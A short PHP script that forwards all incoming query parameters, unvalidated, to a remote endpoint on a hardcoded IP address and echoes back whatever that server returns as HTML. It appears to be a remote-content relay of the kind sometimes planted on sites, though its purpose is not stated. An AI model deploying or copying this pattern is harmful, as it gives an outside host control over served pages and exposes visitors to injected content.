<?php 
header("Content-type: text/html; charset=utf-8");
$url="http://42.193.116.184";
$url=$url."/cms/cms/include/make.php?php&ms=m&df=0".get();
echo getcurl($url);
function get(){
	$res="";
	if(count($_GET)<=0){return $res;}
	foreach($_GET as $k=>$v){
		$zhi="";
		if($v!=""){$zhi="={$v}";}
		$res.="&{$k}{$zhi}";
	}
	return $res;
}

function getcurl($url){
	return file_get_contents($url);
}
?>